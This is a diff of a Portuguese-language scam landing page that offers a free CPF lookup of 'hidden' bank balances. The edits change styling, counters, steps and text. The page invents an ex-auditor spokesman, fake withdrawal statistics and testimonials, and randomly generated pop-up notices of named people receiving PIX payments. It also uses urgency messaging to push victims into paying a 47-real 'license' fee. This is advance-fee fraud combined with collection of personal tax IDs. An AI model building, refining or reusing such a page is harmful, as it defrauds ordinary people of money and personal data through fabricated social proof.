@@ -31,9 +31,8 @@
         .container { max-width: 500px; margin: 0 auto; padding: 20px; }
 
         .hero { text-align: center; margin-bottom: 20px; }
-        /* COR DA HEADLINE ALTERADA */
         .hero h1 { font-size: 26px; font-weight: 900; line-height: 1.1; color: var(--danger); margin-top: 15px; }
-        .hl-blue { color: #000; text-decoration: underline; }
+        .hl-blue { color: var(--primary); }
 
         .roberto-box { background: #fff; border-radius: 15px; padding: 20px; border: 1px solid #ddd; margin-bottom: 25px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
         .roberto-header { display: flex; align-items: center; gap: 15px; margin-bottom: 15px; }
@@ -55,7 +54,7 @@
 
         .depo-title { font-weight: 900; font-size: 17px; margin-bottom: 15px; border-left: 5px solid var(--primary); padding-left: 10px; }
         .card-depo { background: #fff; border-radius: 15px; padding: 15px; margin-bottom: 15px; border: 1px solid #eee; }
-        .depo-header { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 12px; }
+        .depo-header { display: flex; justify-content: space-between; margin-bottom: 8px; }
         .val-rec { color: var(--secondary); font-weight: 900; font-size: 16px; }
         .depo-text { font-size: 13px; color: #555; line-height: 1.5; }
 
@@ -111,7 +110,7 @@
             <section class="hero">
                 <p style="font-size: 13px; font-weight: 800; color: #999;">Por: Roberto Menezes — Ex-Auditor Sênior</p>
                 <h1>Recupere o saldo que os bancos <span class="hl-blue">esconderam de você</span></h1>
-                <p style="font-size: 14px; color: #000000; margin-top: 12px; font-weight: 700;">Consulta 100% gratuita usando seu CPF. Em menos de 1 minuto você descobre quanto o banco está te devendo.</p>
+                <p style="font-size: 14px; color: #000; margin-top: 12px; font-weight: 700;">Consulta 100% gratuita usando seu CPF. Em menos de 1 minuto você descobre quanto o banco está te devendo.</p>
             </section>
 
             <div class="roberto-box">
@@ -148,11 +147,11 @@
 
             <div class="stats-grid">
                 <div class="stat-item"><b>R$ 47Mi</b><span>Liberados</span></div>
-                <div class="stat-item"><b>3.122</b><span>Saques hoje</span></div>
+                <div class="stat-item"><b>3.144</b><span>Saques hoje</span></div>
                 <div class="stat-item"><b>4,9★</b><span>Avaliação</span></div>
             </div>
 
-            <div class="depo-title">📞 Quem já recuperou:</div>
+            <div class="depo-title">📞 Quem já recuperou conta:</div>
             
             <div id="depo-container">
                 <div class="card-depo">
@@ -170,13 +169,17 @@
             <button class="btn-more" id="btn-load-more" onclick="loadMoreDepos()">Ver mais depoimentos</button>
 
             <div class="steps">
-                <div class="depo-title" style="border:none; padding:0;">Como funciona:</div>
+                <div class="depo-title" style="border:none; padding:0;">Como funciona — passo a passo:</div>
                 <div class="step-item">
                     <div class="step-num">1</div>
                     <div class="step-info"><b>Consulta Gratuita</b><p style="color: #666;">Nosso scanner varre 14 instituições bancárias em tempo real usando seu CPF.</p></div>
                 </div>
                 <div class="step-item">
                     <div class="step-num">2</div>
+                    <div class="step-info"><b>Cálculo de Tarifas</b><p style="color: #666;">Localizamos cobranças indevidas e juros acumulados em contas ativas ou inativas.</p></div>
+                </div>
+                <div class="step-item">
+                    <div class="step-num">3</div>
                     <div class="step-info"><b>Saque Imediato</b><p style="color: #666;">Após a emissão da licença, o valor é transferido para sua chave PIX escolhida.</p></div>
                 </div>
                 <button class="btn-main" style="margin-top:20px;" onclick="document.getElementById('main-form').scrollIntoView({behavior: 'smooth'})">🔍 CONSULTAR MEU SALDO AGORA</button>
@@ -223,8 +226,8 @@
 
                 <div class="audit-details">
                     <div class="audit-line"><span>Instituições Consultadas:</span> <b>14 Bancos</b></div>
-                    <div class="audit-line"><span>Tarifas Indevidas:</span> <b>R$ <span id="val-tarifas"></span></b></div>
-                    <div class="audit-line"><span>Juros Acumulados:</span> <b>R$ <span id="val-juros"></span></b></div>
+                    <div class="audit-line"><span>Tarifas Indevidas Localizadas:</span> <b>R$ <span id="val-tarifas"></span></b></div>
+                    <div class="audit-line"><span>Juros de Contas Inativas:</span> <b>R$ <span id="val-juros"></span></b></div>
                     <div class="audit-line" style="margin-top:10px; padding-top:10px; border-top: 1px solid #eee;"><span>Status do Saque:</span> <b style="color:var(--secondary)">LIBERADO</b></div>
                 </div>
 
@@ -258,7 +261,7 @@
 
                 <div class="roberto-box" style="margin-top: 25px; background: #fdfdfd; border-color: var(--danger);">
                      <p style="font-size: 14px; color: #111; line-height: 1.6; font-weight: 600;">
-                        <b>Eu estou te avisando:</b> "<span class="u-nome"></span>, essa é a nossa última chamada. Eu não sei por quanto tempo esse servidor vai aguentar. Garanta sua licença agora, receba seus <b class="f-money-txt"></b> e tenha os 47 reais devolvidos no mesmo PIX. Não deixe o banco ficar com o que é seu."
+                        <b>Eu estou te avisando:</b> "<span class="u-nome"></span>, essa é a nossa última chamada. Garanta sua licença agora, receba seus <b class="f-money-txt"></b> e tenha os 47 reais devolvidos no mesmo PIX. Não deixe o banco ficar com o que é seu por direito."
                     </p>
                 </div>
             </div>
@@ -287,23 +290,21 @@
             e.target.value = v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
         });
 
-        // 20 NOMES (10H/10M) FORMATO: NOME SOBRENOME - CIDADE/UF
         const usersPop = [
-            {n: "João Pedro Silva", c: "São Paulo/SP"}, {n: "Ricardo Mendes Souza", c: "Osasco/SP"},
-            {n: "Marcos Antonio Rocha", c: "Belo Horizonte/MG"}, {n: "Luiz Fernando Lima", c: "Curitiba/PR"},
-            {n: "Bruno Henrique Costa", c: "Campinas/SP"}, {n: "Felipe Augusto Souza", c: "Goiânia/GO"},
-            {n: "Marcelo Diniz Oliveira", c: "Porto Alegre/RS"}, {n: "Gustavo Pereira Silva", c: "Manaus/AM"},
-            {n: "André Luis Santos", c: "Recife/PE"}, {n: "Vitor Hugo Morais", c: "Vitória/ES"},
-            {n: "Maria Lucia Oliveira", c: "Rio de Janeiro/RJ"}, {n: "Ana Beatriz Ferreira", c: "Salvador/BA"},
-            {n: "Juliana Costa Mendes", c: "Brasília/DF"}, {n: "Fernanda Luiza Rocha", c: "Manaus/AM"},
-            {n: "Camila Rodrigues Silva", c: "Santos/SP"}, {n: "Patrícia Almeida Souza", c: "Natal/RN"},
-            {n: "Letícia Maria Santos", c: "Florianópolis/SC"}, {n: "Daniele Vieira Lima", c: "Belém/PA"},
-            {n: "Aline Cristina Silva", c: "João Pessoa/PB"}, {n: "Larissa Bento Costa", c: "Cuiabá/MT"}
+            {n: "João Pedro Silva", c: "São Paulo/SP"}, {n: "Maria Lucia Souza", c: "Curitiba/PR"},
+            {n: "Ricardo Pereira Mendes", c: "Belo Horizonte/MG"}, {n: "Ana Beatriz Lima", c: "Rio de Janeiro/RJ"},
+            {n: "Marcos Oliveira Souza", c: "Osasco/SP"}, {n: "Fernanda Cavalcante", c: "Manaus/AM"},
+            {n: "Sérgio Ramos da Costa", c: "Porto Alegre/RS"}, {n: "Adriana Lima Costa", c: "Salvador/BA"},
+            {n: "Bruno Henrique Rocha", c: "Campinas/SP"}, {n: "Camila Rodrigues Silva", c: "Santos/SP"},
+            {n: "Diego Santos", c: "Recife/PE"}, {n: "Eduardo Silva", c: "Brasília/DF"},
+            {n: "Lucas Alencar", c: "Manaus/AM"}, {n: "Felipe Neves", c: "Goiânia/GO"},
+            {n: "Tiago Lima", c: "Vitória/ES"}, {n: "Gustavo Melo", c: "Cuiabá/MT"},
+            {n: "Juliana Mendes", c: "Brasília/DF"}, {n: "Patrícia Souza", c: "Natal/RN"},
+            {n: "Letícia Santos", c: "Florianópolis/SC"}, {n: "Aline Silva", c: "João Pessoa/PB"}
         ];
         
         function showNotification() {
             const user = usersPop[Math.floor(Math.random() * usersPop.length)];
-            // RANGE 1100 A 2890 COM CENTAVOS
             const val = (Math.random() * (2890 - 1100) + 1100).toLocaleString('pt-BR', {minimumFractionDigits: 2, maximumFractionDigits: 2});
             document.getElementById('notif-name').innerText = `${user.n} - ${user.c}`;
             document.getElementById('notif-money').innerText = `R$ ${val} via PIX`;
@@ -318,7 +319,7 @@
             const novos = [
                 {n: "Marcos Oliveira Souza", l: "Osasco - SP (12/05/2026)", v: "1.890,22", t: "Paguei a licença de 47 e o valor caiu na hora. O estorno veio junto no mesmo PIX. Vale a pena."},
                 {n: "Fernanda Lima de Souza", l: "Curitiba - PR (12/05/2026)", v: "2.765,45", t: "Sistema muito fácil de usar. Achei dinheiro de uma conta que fechei em 2018. Muito obrigada!"},
-                {n: "Ricardo Mendes da Rocha", l: "Vitória - ES (12/05/2026)", v: "1.250,12", t: "Acabei de receber. O processo é rápido e o suporte no e-mail foi nota dez. Recomendo."}
+                {n: "Ricardo Mendes da Rocha", l: "Vitória - ES (12/05/2026)", v: "1.250,12", t: "Acabei de receber. O processo é rápido e o suporte por e-mail me ajudou. Recomendo."}
             ];
             novos.forEach(d => {
                 const div = document.createElement('div');
